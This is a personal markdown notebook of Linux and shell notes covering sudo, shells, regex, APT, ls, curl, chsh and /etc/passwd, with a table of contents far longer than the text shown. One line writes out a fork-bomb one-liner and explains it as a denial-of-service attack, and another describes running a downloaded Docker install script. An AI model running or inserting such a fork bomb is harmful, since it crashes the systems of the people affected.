# Acquired Data in Computer Science

Data not to forget.

## Sommaire

- [Sommaire](#sommaire)
- [Linux](#linux)
  * [How Linux Works](#how-linux-works)
    + [Environment variables](#environment-variables)
    + [Hard links and symbolic links](#hard-links-and-symbolic-links)
    + [Super User](#super-user)
    + [Linux distributions and desktop environments](#linux-distributions-and-desktop-environments)
    + [The shell](#the-shell)
    + [Cursed terminal behaviour](#cursed-terminal-behaviour)
    + [Virtual terminals](#virtual-terminals)
    + [OOM-killer score](#oom-killer-score)
    + [Regex](#regex)
      - [Regex Meta-characters](#regex-meta-characters)
      - [Special character classes](#special-character-classes)
      - [Examples](#examples)
    + [Shell wildcard patterns](#shell-wildcard-patterns)
    + [Setting up external hard drives](#setting-up-external-hard-drives)
  * [Differences between Linux distributions](#differences-between-linux-distributions)
    + [Ubuntu](#ubuntu)
    + [Debian](#debian)
    + [Arch Linux](#arch-linux)
    + [Fedora](#fedora)
    + [OpenSUSE](#opensuse)
    + [NixOS](#nixos)
      - [Package management in NixOS](#package-management-in-nixos)
      - [Configurations in NixOS](#configurations-in-nixos)
  * [Dual boots](#dual-boots)
  * [Linux miscellaneous things](#linux-miscellaneous-things)
  * [Linux package managers](#linux-package-managers)
    + [How APT Works](#how-apt-works)
    + [APT Subcommands](#apt-subcommands)
  * [Linux base system commands and options](#linux-base-system-commands-and-options)
    + [`man`](#man)
    + [`df`](#df)
    + [``free``](#free)
    + [``cd``](#cd)
    + [`ls`](#ls)
    + [`htop`](#htop)
    + [`tar`](#tar)
    + [`curl`](#curl)
    + [`mount`](#mount)
    + [`umount`](#umount)
    + [`grep`](#grep)
    + [`chsh`](#chsh)
    + [`.bashrc` and `.profile`](#.bashrc-and-.profile)
    + [`/etc/shells`](#/etc/shells)
    + [`/etc/passwd`](#/etc/passwd)
    + [`/etc/shadow`](#/etc/shadow)
    + [`chroot`](#chroot)
    + [`nc` (netcat)](#nc-(netcat))
    + [`alias`](#alias)
    + [Other small commands](#other-small-commands)
    + [Remaining commands to deal with](#remaining-commands-to-deal-with)
  * [Other Linux packages](#other-linux-packages)
    + [Nano](#nano)
    + [Tldr](#tldr)
    + [Cron](#cron)
    + [Poppler-utils](#poppler-utils)
    + [xpdf or xpopple](#xpdf-or-xpopple)
    + [Screen](#screen)
  * [Commands cool things](#commands-cool-things)
  * [Linux miscellaneous things](#linux-miscellaneous-things)
- [Operating systems](#operating-systems)
  * [The kernel](#the-kernel)
  * [I/O and drivers](#i/o-and-drivers)
  * [Sockets](#sockets)
  * [Miscellaneous OS information](#miscellaneous-os-information)
- [Web](#web)
  * [Web development](#web-development)
  * [HTML](#html)
    + [HTML Basics](#html-basics)
  * [CSS](#css)
  * [Django](#django)
  * [PHP](#php)
  * [Further reading and tools](#further-reading-and-tools)
  * [Web certificates](#web-certificates)
  * [Web hosting](#web-hosting)
  * [Identity providers](#identity-providers)
    + [Authentik](#authentik)
  * [Self-hosting](#self-hosting)
    + [CodiMD](#codimd)
    + [HedgeDoc](#hedgedoc)
  * [Web miscellaneous things](#web-miscellaneous-things)
- [Go](#go)
  * [Go basics](#go-basics)
  * [fmt](#fmt)
  * [math](#math)
    + [math/cmplx](#math/cmplx)
    + [math/rand](#math/rand)
    + [time](#time)
  * [Go interpreters](#go-interpreters)
    + [Yaegi](#yaegi)
  * [Echo web framework](#echo-web-framework)
- [Python](#python)
  * [Python virtual environments](#python-virtual-environments)
- [Windows](#windows)
  * [Windows Powershell](#windows-powershell)
  * [WSL](#wsl)
  * [Windows miscellaneous information](#windows-miscellaneous-information)
- [SSH](#ssh)
  * [How SSH works](#how-ssh-works)
  * [SSH usage](#ssh-usage)
  * [SSH Config files](#ssh-config-files)
  * [SCP](#scp)
- [Cybersecurity](#cybersecurity)
  * [Metadatas](#metadatas)
  * [Cross-site scripting (XSS)](#cross-site-scripting-(xss))
  * [Cryptography](#cryptography)
    + [Symmetric cryptography](#symmetric-cryptography)
    + [Asymmetric cryptography](#asymmetric-cryptography)
  * [Reverse](#reverse)
  * [Steganography](#steganography)
  * [Forensic](#forensic)
  * [Network](#network)
  * [OSint](#osint)
  * [Other](#other)
- [Virtualization](#virtualization)
  * [Containers and virtual machines](#containers-and-virtual-machines)
  * [ProxmoxVE](#proxmoxve)
- [Git](#git)
  * [Creating a repo](#creating-a-repo)
  * [Git branches](#git-branches)
  * [Git merge](#git-merge)
  * [Git rebase](#git-rebase)
    + [Fast-forwarding](#fast-forwarding)
  * [Git remotes](#git-remotes)
  * [Git credentials](#git-credentials)
  * [Git stash](#git-stash)
    + [SSH](#ssh)
  * [Git CICD](#git-cicd)
    + [GitHub Actions](#github-actions)
  * [Git miscellaneous information](#git-miscellaneous-information)
- [Computer](#computer)
  * [Processors](#processors)
  * [Storage types](#storage-types)
  * [Character encoding](#character-encoding)
    + [ASCII](#ascii)
    + [UTF-8](#utf-8)
    + [Unicode](#unicode)
    + [Other ways of encoding / other encoding tables](#other-ways-of-encoding-/-other-encoding-tables)
    + [Building a server](#building-a-server)
  * [Other](#other)
- [Computer networking Theory](#computer-networking-theory)
  * [The OSI Model](#the-osi-model)
    + [Layer 1 - Physical layer](#layer-1---physical-layer)
    + [Layer 2 - Data Link layer](#layer-2---data-link-layer)
    + [Layer 3 - Network layer](#layer-3---network-layer)
    + [Layer 4 - Transport layer](#layer-4---transport-layer)
    + [Layer 5 - Session layer](#layer-5---session-layer)
    + [Layer 6 - Presentation layer](#layer-6---presentation-layer)
    + [Layer 7 - Application layer](#layer-7---application-layer)
  * [Layer 1 networking equippment](#layer-1-networking-equippment)
    + [Optical fibers](#optical-fibers)
    + [Ethernet cables](#ethernet-cables)
    + [DWDM Equippment](#dwdm-equippment)
    + [Transcievers](#transcievers)
    + [Ethernet hubs](#ethernet-hubs)
  * [Layer 2 networking theory and equippment](#layer-2-networking-theory-and-equippment)
  * [Layer 3 networking equippment](#layer-3-networking-equippment)
  * [Layer 3 networking theory](#layer-3-networking-theory)
  * [Layer 6 networking theory](#layer-6-networking-theory)
  * [Networking protocols](#networking-protocols)
    + [Link layer protocols](#link-layer-protocols)
      - [STP](#stp)
      - [MSTP](#mstp)
      - [LACP](#lacp)
      - [SNMP](#snmp)
      - [LLDP](#lldp)
      - [ARP](#arp)
      - [Tunnels](#tunnels)
      - [PPP](#ppp)
      - [MAC](#mac)
      - [IPv4](#ipv4)
      - [IPv6](#ipv6)
      - [ICMP](#icmp)
      - [NDP](#ndp)
      - [ECN](#ecn)
      - [IGMP](#igmp)
      - [IPsecmore...](#ipsecmore...)
    + [Network layer Protocols](#network-layer-protocols)
      - [Internet Protocol (IP)](#internet-protocol-(ip))
      - [Internet Control Message Protocol (ICMP)](#internet-control-message-protocol-(icmp))
    + [Transport layer protocols](#transport-layer-protocols)
      - [TCP](#tcp)
      - [UDP](#udp)
  * [VLANS](#vlans)
  * [QinQ](#qinq)
  * [VXLANS](#vxlans)
  * [VPNs](#vpns)
  * [Firewalls, proxies, reverse-proxies](#firewalls,-proxies,-reverse-proxies)
  * [DHCP](#dhcp)
  * [NAT](#nat)
  * [Other protocols](#other-protocols)
  * [Control plane, Management plane, Data plane](#control-plane,-management-plane,-data-plane)
- [Computer Networking Practice](#computer-networking-practice)
  * [Layer 1 networking pratice](#layer-1-networking-pratice)
  * [Layer 2 networking practice](#layer-2-networking-practice)
    + [MiktoTik switches](#miktotik-switches)
    + [Cisco switches](#cisco-switches)
  * [Layer 3 networking practice](#layer-3-networking-practice)
    + [Physical routers](#physical-routers)
    + [Virtual routers](#virtual-routers)
  * [Netbox](#netbox)
  * [VPNs](#vpns)
    + [OpenVPN](#openvpn)
    + [Wireguard](#wireguard)
  * [Reverse-proxies](#reverse-proxies)
    + [Nginx](#nginx)
    + [Caddy](#caddy)
    + [Systemctl](#systemctl)
    + [Traefik](#traefik)
    + [Haproxy](#haproxy)
- [Other](#other)
  * [VSCode](#vscode)
  * [ffmpeg](#ffmpeg)
  * [Chrome](#chrome)
  * [Markdown](#markdown)
  * [The FTP Protocol](#the-ftp-protocol)
  * [Vivenot.dev](#vivenot.dev)
  * [OSInt](#osint)
  * [OpenGL](#opengl)
  * [Cairo](#cairo)
  * [Free software](#free-software)
  * [@ This document](#this-document)
  * [Fun facts](#fun-facts)
  * [Other other](#other-other)
- [Remaining questions](#remaining-questions)
- [Rezel](#rezel)
  * [Infrastructures internes](#infrastructures-internes)
  * [FAI (Fournission d'Accès à Internet)](#fai-(fournission-d'acc�s-�-internet))
  * [Choses faites et à faire](#choses-faites-et-�-faire)
  * [Autre](#autre)
  * [Rezel Daily](#rezel-daily)
- [What is...](#what-is...)
- [Ressources](#ressources)
- [Projets](#projets)
- [Unsorted](#unsorted)

## Linux

### How Linux Works

#### Environment variables

- Environnment variables all together can be accessec using `printenv`.
- They can be accessed individually with `echo $VAR`.
- What the different environment variables do and mean : (...)
  * `HOME=/home/sandwichgouda` : value of `~`
  * `PWD` : Print Working Directory
  * `OLDPWD` : The previous Working Drirectory. Very useful ! `cd $OLDPWD`
  * `TERM=xterm-256color` ?
  * `LS_COLORS` ?
- Do they / can they change depending on the distro ? On the Des

#### Hard links and symbolic links

Un lien symbolique (symlink) est un fichier qui pointe vers un (autre) fichier ou dossier. C'est un peu comme un raccourci (`.lnk`) sur Windows. Ils sont aussi appelés softlinks, car ils sont des pointeurs indirects, par opposition aux hardlinks qui pointent directement vers la data du disque. Ils peuvent pointer vers des fichiers qui sont sur d'autres systèmes de fichiers ou partitions. Le chemin peut être relatif ou absolu. Ils sont dits _broken_ (broken links) lorsque ce vers quoi ils pointent n'existe plus. Ils peuvent être utilisés pour éviter de dupliquer des fichiers ou dossiers, ou pour éviter d'avoir à préciser la version d'une commande ou d'un éxécutable à chaque fois qu'on l'éxécute. Ils sont créés avec la commande `ln`. Attention, cette dernière crée des hard links par défaut, il faut utiliser `--symbolic` pour que le lien soit symbolique. (...)

#### Super User

 `sudo su`, or `sudo -i`, allow to a sudoers (users that are sudo, that is part of the group sudo) to login as `root`. That is, its terminal will from now on be logged in as root.  This creates a subshell : `CTRL+D` exits it in both cases. The difference between both commands is a question of shell environment and of environment variables. `sudo -i` provides a full login experience and simulates an environment as if you really just logged in as `root`, while `sudo su` keeps you in your current environment with elevated privileges.  
 More precisely : 
- `sudo -i` simulates a full root login shell (in particular, you actually have to log in)
- `sudo su` switches to root without login environment.
- `sudo -i` shanges to root's home directory (`/root`)
- `sudo su` stays in the current working directory
- `sudo -i` loads root user's login environment.  
- `sudo su` keeps current user environment by default
- `sudo -i` Loads root-specific profile files (e.g., .bashrc, .profile).  
- `sudo su` Does not load root profile files unless sudo su - is used.
| Aspect | `sudo -i` | `sudo su` |
|--------|-----------|-----------|
| Shell Type | Simulates a full root login shell. | Switches to root without login environment. |
| Working Directory | Changes to root's home directory (`/root`). | Stays in the current working directory. |
| Environment Variables | Loads root user's login environment. | Keeps current user environment by default. |
| Profile Scripts | Loads root-specific profile files (e.g., `.bashrc`, `.profile`). | Does not load root profile files unless `sudo su -` is used. |

#### Linux distributions and desktop environments

If I got this right, Linux distributions are build on top of the Linux kernel, and Desktop Environments are build on top of Linux distributions. Without a linux Linux distributions, one can't do anything with the kernel alone. With a distribution, one has access to the shell ; but there isn't any graphical user interface. With a Desktop environment, you can have a GUI !

Linux distributions include :
- Debian
- Ubuntu (Debian-based)
- Redhat
- Gentoo
- Fedora
- NixOS (based on the `nix` package manager)
- Kali Linux
- Oracle Linux
- openSUSE-Tumbleweed
- openSUSE-Leap

Desktop environments include :
- KDE
- GNOME
- XFCE

#### The shell

When we speak of the command line, we are really referring to the **shell**. The shell is a program that takes keyboard commands and passes them to the operating system to treat. Almost all Linux distributions supply a shell program from the GNU Project called `bash`. The name BASH is an acronym for Bourne Again Shell, a reference to the fact that bash is an enhanced replacement for SH, the original Unix shell program written by Steve Bourne. When using a graphical user interface, one needs another program called a **terminal emulator** to interact with the shell. Although, in desktop menus, it is most often called `terminal`. The commands are written in what we call a **command prompt**. 
* In KDE, the terminal is emulated by `Konsole`
* In GNOME, the terminal emulated by `GNOME terminal`
* In XFCE, the terminal is emulated by `xfce4 terminal`
* In the [X Window System](https://www.x.org/wiki/), the terminal is emulated by [`xterm`](https://invisible-island.net/xterm/).

- In a shell, the last character should be either a hash mark (`#`) or a dollar sign (`$`). The hash mark means the current user has Super User privileges.
- The X Window System, also called X11 or just X, (an underlying engine that makes the GUI go) supports a quick copy-and-paste technique : when highlighting some text, it is copied into a buffer maintained by X. Then, a middle mouse button click (or right-click, on Windows, and maybe also in some other terminal emulators). `CTRL+C` and `CTRL+V` do not work (use `CTRL+SHIFT+C` and `CTRL+SHIFT+V`).
- There are actually several shells, i.e. there exist several programs, developped by different people, that are [Unix shells](https://en.wikipedia.org/wiki/Unix_shell) :
  * `sh` : Bourne Shell
  * `ksh` : KornShell 
  * `csh` : C Shell
  * `tcsh` ("T-Shell", "TC-Shell" or "TSCH") : TENEX C Shell
  * `bash` : Bourne Again Shell
  * `zsh` : Z Shell
  * `PowerShell` : Originally developed for Windows and now available to macOS and Linux.

For further investigation : 
- [Comparison of command shells](https://en.wikipedia.org/wiki/Unix_shell)
- [List of Unix (POSIX) commands](https://en.wikipedia.org/wiki/List_of_Unix_commands)
- [Read–eval–print loop](https://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop)
- [Restricted shell](https://en.wikipedia.org/wiki/Restricted_shell)
- [Shell (computing)](https://en.wikipedia.org/wiki/Shell_(computing))
- [Shell account](https://en.wikipedia.org/wiki/Shell_account)
- [Shell script](https://en.wikipedia.org/wiki/Shell_script)
- [Shell shoveling](https://en.wikipedia.org/wiki/Shell_shoveling)

#### Cursed terminal behaviour

- It can happend that your terminal has a _cursed_ behaviour described as follows :
  * Instead of `user@machine#` or `user@machine$` (depending on whether you have Super User rights or not), the prompt is a mere `$` sign
  * The terminal does not behave correctly upon pressing the up and down arrow to navigate in the command history : does not show older (or newer) commands and only prints (cursed) `^[[A` and `^[[B` to standard output instead each time UP/DOWN arrow keys are pressed
  * The Terminal does not autocomplete when `TAB` is pressed, and writes an actual tabulation (huge horizontal space) into the command line instead
- When this happens, you should see, using `echo $SHELL`, that the program (binary file) used to run the shell (to run the process that displays a shell) is most likely `/bin/sh`. This means you're using SH, or Shell, the older version of BASH (Recall that BASH means Bourne Again Shell, and is newer a version of the original Shell, written bu Stephen Bourne), instead of bash, located in `/usr/bin/bash`. 
- Note : you can see shell binaries with `which sh`, `which bash`...
- Hence, a way around this is to simply type `bash` in the Shell. This will create a childprocess to the current `sh` shell, the binary program of which will be `bash` instead of `sh`. 
- More generally, if you have `I/O` issues, in particular this cursed behaviour issue, in a command prompt, a way around this is to use a Read-Line wrapper such as `rlwrap`.
  * A Read-Line wrapper (typically rlwrap, actually) is a wrapper that will handle I/O for a given process.
  * For instance, `rlwrap sh` will run a Shell (sh) instance, but with I/O managed by `rlwrap`. 
  * This allows to bypass the shitty (to put it more nicely : old, outdated) I/O handling of `sh` - or any other process!
  * So, if you have, say, for instance, a Go interpreter, like `yaegi`, that takes form of a command prompt, but that does not handle I/O correctly (with the same, or any other unwanted behaviour), you can use `rlwrap [...]` (`rlwrap yaegi`, `rlwrap sh`, `rlwrap sage`, `rlwrap python3`...)(python and sage manage I/O quite well, but yea)
  * You can also change your default shell for a given user, see [chsh](#chsh)
  * Voilà :)

#### Virtual terminals

Even if one ha no terminal emulator running, several terminal sessions continue to run behind the graphical desktop. Called _virtual terminals_ or _virtual consoles_, these sessions can be accessed on most Linux distributions with `CTRL+ALT+F1` to `CTRL+ALT+F6` on most systems. When a session is accessed, it presents a login prompt into which we can enter our username and password. To switch from one virtual console to another, press `ALT` and `F1`-`F6`. To return to the graphical desktop, press ALT-F7.

#### OOM-killer score

Quand la RAM sature, le noyau Linux `kill` un des process en cours d'éxécution. Mais lequel ? Pour déterminer quel process tuer, Linux utilise une heuristique (badness heuristic) qui attribue un score (OOM-killer score)(OOM pour Out Of Memory) entre 0 (never kill) et 1000 (always kill). Le process ayant l'OOM-killer score le plus élevé est tué. L'OOM-killer score est _roughly_ le pourcentage de RAM utilisée par chaque process par rapport à sa RAM allouée. Par exemple, si un process utilise 50% de sa RAM allouée, son OOM-killer score sera de 500. La commande `choom` permet d'afficher et de modifier les OOM-killer score.

#### Regex

Regular Expressions (often abbreviated as Regex, or Regexp), are expressions that can be used to describe patterns very synthetically.

##### Regex Meta-characters

- `.` : Matches any single character except a newline character (`\n`)
- `*` : Matches 0 or more of the preceding element.
- `?` : Matches 0 or 1 of the preceding element.
- `[]` : Matches any one of the characters inside the brackets.
  * `[a-z]` matches any lowercase letter.
  * `[A-Z]` matches any uppercase letter.
  * [0-9] matches digits
  * [a-zA-Z0-9_] matches numbers, digits, and underscores.
- `[^]` : Matches any character **except** the ones inside the brackets. `^` basically means negation.
- `^` : Matches the beginning of a line.
- `$` : Matches the end of a line.
- `{n}` : Matches `n` occurences of the preceding element. `n` must be given in decimal (not a literal value).
- `{n,m}` : Matches any `k` occurences of the preceding element, for any $n \leqslant k \leqslant m$.
- `{n,}` : Matches any `k` occurences of the preceding element, for any $k \geqslant n$.
- `{,m}` : Matches any `k` occurences of the preceding element, for any $k \leqslant m$.
- `\` : Escapes special characters to treat them as literals.
- Parenthesis `()` allow to group things.
- `...|...` : Matches either the left or the right hand side of the pipe.
  * Note : By default, `...|...` is prioritized as `(...)|(...)` (see example above :).
  * To apply the logical `OR`to only some part of the pattern, use `...(..|..)...`

##### Special character classes

- `\d` : Matches any digit : [0-9]
- `\w` : Matches any word character : letters, digits, and underscore : [a-zA-Z0-9_]
- `\s` : Matches any whitespace character : spaces, tabs, newlines.
- `\D` : Matches any non-digit character : [^0-9]
- `\W` : Matches any non-word character : [^a-zA-Z0-9_]
- `\S` : Matches any non-whitespace character.
- `\b` : Matches a position where a word boundary occurs, i.e., the position between a word character (letter, digit, or underscore : [a-zA-Z0-9_]) and a non word character (whitespace, punctuation...)
- `\B` : Matches a position that is NOT a word boundary.

##### Examples

- `h.t` matches `hit`, `hot`, `hat`... any thre character sequence of the form `h_t`.
- `ho*t` matches `ht`, `hot`, `hoot`, `hooot`, ..., `hooooooooot`, ...
- `ho?t`matches `ht` and `hot`.
- `h[aeiou]t` matches `hat`, `hit`, `hot`, `hut` and `het`.
- `h[^aeiou]t` matches any word of the form `h.t` except `hat`, `hit`, `hot`, `hut`, `het`
- `^hello` matches any line starting with `hello`.
- `world$` matches any line ending with `world`.
- `ho{19}t` matches only `hooooooooooooooooooot` (here `o` appears 19 times).
- `ho{2,19}t` matches `hoot`, `hooot`, ...,  `hooooooooooooooooooot` (here `o` appears 19 times again).
- `\+`matches `+`, `\.`matches `.`, `\?`matches `?`, ...
- `cat|dog` matches both `cat` and `dog`.
- `(c|d)og` matches `cog` and `dog`.
- `\bword\b` matches "word" as a standalone word, i.e., does not match  "sword" or "wording".
- `\Bword` matches `sword`, but not `word`.
- `word\B` matches `wordy`, but not `word`.

#### Shell wildcard patterns 

They can be used in the terminal or in `*` : all

#### Setting up external hard drives

First, plug the hard drive. 
Then use parted to create a partition and format the disk.

### Differences between Linux distributions 

#### Ubuntu

#### Debian

#### Arch Linux

#### Fedora

#### OpenSUSE

#### NixOS

NixOS is a distribution based on the Nix package manager. It is special in it's package management and configuration systems. NixOS is the package manager that has the most package. 

The NixOS repo

AUR repo

##### Package management in NixOS

##### Configurations in NixOS

All configurations options can be written in `/etc/nixos/configuration.nix`.

### Dual boots

- At each boot, the bootloader, often GRUB, allows to choose (and chooses) between several OS to boot.
- To create a dual boot, you must reduce the partition. Use the Disk manager on Windows to do that. 100Go is a good amount to install and use a Linux distribution.
- NTFS the the (only) Windows File System Manager. It is the only one on Windows that allows to make disk partition reductions. FAT32, EXT4 are other File Systems.
- BitLocker is on Windows by default. It is a disk cyphering system. 
- F12, SUPPR, F1, F2

### Linux miscellaneous things

- `cd`is a shell built-in command. It is not like other commands. For instance you cannot do `man cd`. (Any other differences ?)
- One gives several arguments to a command by separating them with commas. Example : `htop --pid 1,2,3`
- Remember to `(sudo) apt update` from time to time !
- LTS = Last Stable Release
- If you get a `Permission denied` error trying to remove something while logged in as `root` and/or using `sudo`, it might be because what you're deleting is used by a process (In other words : "This cannot be removed because it's used by ... ; please close it"). (that's one of a kind of silent error)
- To install docker easily : 
  * `wget get.docker.com`
  * This downloads `index.html`
  * When using `cat`, you can see `index.html`is actually a bash script !
  * -> `bash index.html` installs docker
  * Note that this comes with its load of drawbacks : "This script is intended as a convenient way to configure docker's package repositories and to install Docker Engine, This script is not recommended for production environments. Before running this script, make yourself familiar with potential risks and limitations, and refer to the installation manual at https://docs.docker.com/engine/install/ for alternative installation methods.
- When a prompt asks you what to do - typically : "Do this ? [Y/n] / Are you sure ? [y/N]" -, the option that's in uppercase letter is the "default" one, i.e., concretely, the one that'll be chosen if the prompt is left blank.
- `:(){ :|:& };:` is a fork bomb. A fork bomb (or rabbit virus) is a denial-of-service (DoS) attack wherein a process continually replicates (forks) itself to deplete available system resources, slowing down or crashing the system due to resource starvation.

### Linux package managers

- `dpkg` stands for Debian Package Manager.
- It is actually used and embedded into `apt`
- `apt` is a frontend that simplifies the usage of APT by combining `dpkg`, `apt-cache`, `apt-get`, `apr-mark`, `apt-file`, and more.
- You can use local mirrors to be able to work 100% offline !
- `apt` is the package manager for Ubuntu/Debian
- `pacman` is the package manager on Arch 
- `yum` is the one for Redhat/Fedora

#### How APT Works

APT refers to a list of package available at `https://packages.ubuntu.com/` (...)

#### APT Subcommands

- `apt`
  * `apt search` searches and prints the list of packages containing the 
- `tree`
  * `tree -L 2` : maximum depth = 2
- `apt`
  * `apt`
    + `apt search`
    + `
  * `dpkg`
  * `apt-get`
  * `apt-cache`
  * `apt-mark`
    + `apt-mark showmanual` (supposedly) shows the list of all manually installed WSL packages. There are, actually, more packages printed than that. See [Linux packages](#linux-packages) for more info.
- `apt-file search` seemingly works better than `apt search`
- If the installation of a package fails : `sudo apt install pip --fix-missing` ; `sudo apt --fix-broken install` 
- `dpkg -L packagename` displays exacly all files added to the system after installing packagename. In particular, `dpkg -L packagename | grep /usr/bin` should display all commands newly installed !
- `apt upgrade` upgrades installed packages. It does not remove anything or install anything more than what's not installed.
- `apt-get dist-upgrade` does what upgrade does while also intelligently handling changing dependencies with new versions. It a "smart" conflict resolution system, and it will attempt to upgrade the most important packages at the expense of less important ones if necessary. _Bref_, it is better.

### Linux base system commands and options

#### `man`

- Read the first lines of the manual - the DESCRIPTION section, it is often enlightening !
- It is possible to move sideways using the left and right arrow keys ! 
- Press `h` while in a man page to display help, in particular navigation and searching help.
- Type `/` while in a man page to open Search Forward. 
  * Type in a keyword or a regular expression, press ENTER when finished.
  * Pressing ENTER will search forward for next occurence. 
  * Pressing `N` will search for the next occurence of the regex.
  * Pressing `SHIFT+N` will search for the previous occurence of the regex.
- Type `?` while in a man page to open Search Backward. 
  * It works the same as Search Foward, but seaches backwards when pressing `ENTER`.
  * You can always use `N` and `SHIFT+N` to find next and previous occurences.
- Press `D` to go down **half a page**. Press `U` to go up **half a page**.

#### `df`

Reports file system disk space usage by showing the current amount of free space on each disk drive.

- If a file (resp. files) is (resp. are) given as argument : ``df`` displays the amount of disk space available on the file system containing the file (resp. on each file system containing each file).
- If no file name is given, the space available on all currently mounted file systems is shown. 
- If an argument is the absolute file name of a disk device node containing a mounted file system, ``df`` shows the space available on that file system rather than on the file system containing the device node.  

* ``-h, --human-readable`` : print sizes in powers of 1024 (e.g., 1023M)
* ``-H``, ``--si`` : print sizes in powers of 1000 (e.g., 1.1G)

#### ``free``

Displays the amount of free and used memory in the system

- ``-b, --bytes`` : show output in bytes
- ``-k``, ``--kibi`` : show output in kibibytes 
- ``-m``, ``--mebi`` : show output in mebibytes
- ``-g``, ``--gibi`` : show output in gibibytes
- ``--tebi`` : show output in tebibytes
- ``--pebi`` : show output in pebibytes
- ``--kilo`` : show output in kilobytes 
- ``--mega`` : show output in megabytes
- ``--giga`` : show output in gigabytes 
- ``--tera`` : show output in terabytes
- ``--peta`` : show output in petabytes
- ``-h``, ``--human`` show human-readable output, i.e. with the following units :
  * B = bytes
  * Ki = kibibyte
  * Mi = mebibyte
  * Gi = gibibyte
  * Ti = tebibyte
  * Pi = pebibyte

#### ``cd``

- ``cd`` (tout court) is equivalent to ``cd ~``

#### `ls`

- `ls -l` uses a long listing format
- `ls -a` additionnally displays entries starting with `.` (hidden files or directories)(or symbolic links ?)
- `ls -A` is just like ``ls -a`` but ignoting the entries `.` and `..`
- `ls --color` colorizes the output
- `ls -r, --reverse` sorts in reverse order
- `ls -S` sort entries by size
- `ls -s, --size` print the allocated size if each file, in blocks
- `ls -sh, --size --human-readable` prints the sizes in powers of 1024
- `ls -sh --si, --size --human-readable --si` prints the sizes in powers of 1000, not 1024
- `ls --hide=<PATTERN>` hides lines concerned with a given `PATTERN`
- `ls -m` lists entries in full width, comma separated
- `ls -C` lists entries by columns
- `ls -w=WIDTH` set the maximum width for columns display. 0 means no limit
- `ls -x` lists entries in lines instead of by columns
- `ls -X` sorts by **extension**
- `ls --author` if used with `-l`, prints the author of each file
- `ls --group-directories-first` groups directories first
- `ls -r, --reverse` reverses printing order

#### `htop`

- `htop -t` displays processes as a tree.
- `htop -p 1,2,` or `htop --pid 1,2,...` displays only the given PIDs.

#### `tar`

- `tar -xf`

#### `curl`

`curl`  is a tool for transferring data from or to a server. It supports many protocols.

- `curl -O https://example.com/file.txt`
- `curl -o myfile.txt https://example.com/file.txt`
- `curl https://example.com` GET REQUEST
- `curl https://example.com -o output.html` save html response to file
- `curl -X POST -d "param1=value1&param2=value2" https://example.com/api/endpoint`
  * `-X POST:`` Specifies the request method (POST).
  * `-d:`` Sends data in the POST request body.
  * For JSON data : ``curl -X POST -H "Content-Type: application/json" -d '{"key1":"value1", "key2":"value2"}' https://example.com/api/endpoint`` (-H "Content-Type: application/json": Sets the content type to JSON)

#### `mount`

`mount` is a command to mount an external drive (file system), that is, sticking the root of the file tree to a node of another file tree.

- On WSL :
  * Identify the drive letter (``D:\``, ``E:\``, ``F:\``)
  * Create the appropriate folder, in ``/mnt/`` : ``sudo mkdir /mnt/d`` for instance
  * Mount the filesystem : For WSL, ``sudo mount -t drvfs D: /mnt/d``
  * ``-t drvfs`` specifies the filesystem type as ``drvfs``, which is used for mounting Windows drives in WSL.
  * You can then unmount the drive using ``sudo umount /mnt/d``

#### `umount`

Unmount a drive using ``sudo umount /mnt/d`` (or ``/mnt/e``, or ``mnt/f``...)

#### `grep`

- ``grep "regex" file`` : searches for the regex ``regex`` in ``file``
- ``grep -r "regex" /path/to/folder`` : searches recursively in all subfolders

#### `chsh`

This command changes the login shell of a given user.
- The login shell of a user is the shell that's ran whenever the user logs in.
- The default should be `bash`. It it's `sh`, change to `bash`...!
- A normal user may only change the login shell for their own account (for their own user)
- The superuser may change the login shell for any account.
- This is chaned by editing the `/etc/passwd` file. More information at [/etc/passwd](#etcpasswd)
- You can see a list of all available (and valid) login shells in `/etc/shells`. More information et [/etc/shells](#etcshells)
- `chsh -h, --help`
- `chsh -R, --root` : Apply changes in the `CHROOT_DIR` directory and use the configuration files from the `CHROOT_DIR` directory.
- `chsh -s, --shell SHELL` : Specifies the shell. Having the command name in PATH does not suffice, you must specify the `path/to/the/desired/shell/binary/file`.
- If the `-s` option is not selected, `chsh` operates in an interactive fashion, prompting the user with the current login shell. Enter the new value to change the shell, or leave the line blank to use the current one. The current shell (named "default shell" in the prompt) is displayed between a pair of [ ].
- The only restriction placed on the login shell is that the command name must be listed in /etc/shells, unless the invoker is the superuser, and then any value may be added. 
- **An account with a restricted login shell may not change her login shell.** 
- For this reason, placing /bin/rsh in /etc/shells is discouraged since accidentally changing to a restricted shell would prevent the user from ever changing her login shell back to its original value!

#### `.bashrc` and `.profile`

- `.profile` is a script that's executed each time a user logs into the system (login shell)
  * `.profile` is loaded only once, at login (login shell),
  * for instance when opening an SSH session, _bref_, whenever logging in.
  * People typically set environment variables (commands to add them on each session) in this file.
- `.bashrc` is also a script, but its purpose is different. 
  * It's executed each time user opens a new terminal window or new interactive shell (terminal emulators, subshells)(non-login shell)
  * It's also **sourced** by `.profile` on logging in. 
  * `.bashrc` is loaded every time a new terminal session is opened (non-login shell)
  * People typically set up interactive shell behaviors in it (e.g., aliases, prompt...)

#### `/etc/shells`

- This file lists valid login shells on the current OS.
- Typical valid shells include (for instance, on our WSL) : 
  * `/bin/sh`
  * `/bin/bash`
  * `/usr/bin/bash`
  * `/bin/rbash`
  * `/usr/bin/rbash`
  * `/usr/bin/sh`
  * `/bin/dash`
  * `/usr/bin/dash`
  * `/usr/bin/tmux`
  * `/usr/bin/screen`
- Note : 
  * Dash (Debian Almquist SHell) is (supposed to be) a "modern POSIX-compliant implementation of /bin/sh".
    + So, it's a variant of sh, that's implemented to comply with the POSIX standards.
    + So, it's old and should not be used. :)
  * The Korn Shell is a shell (yet another) created by David Korn
  * `rbash` (Restricted Bash) is a shell that aims restricting some of the capabilities available to users (to interactive user sessions), or to a shell scripts running within it. It is intended to provide an additional layer of security, but is insufficient to allow execution of entirely untrusted software.
  * `sh` is also called Bourne Shell. Bash stands for Bourne Again SHell (because Stephen Bourne wrote it)

#### `/etc/passwd`

- The `/etc/passwd` file contains specific information about a user account in a format with seven fields, separated by colons (:). 
- Each line is of the form `username:x:UID:GID:comment:home_directory:shell`
  * `username` is the login name for the user.
    + I must be be unique across the system, typically 1–32 characters, and usually contains only lowercase letters, numbers, and underscores.
  * `x` is the password placeholder. 
    + This field once held the encrypted user password but is now almost always set to x for security reasons.
    + The x indicates that the encrypted password is stored in a separate, shadowed, `/etc/shadow`. Only users with root privileges can access `/etc/shadow`.
    + If this field were blank (though rare), it would allow login without a password, which is usually a security risk.
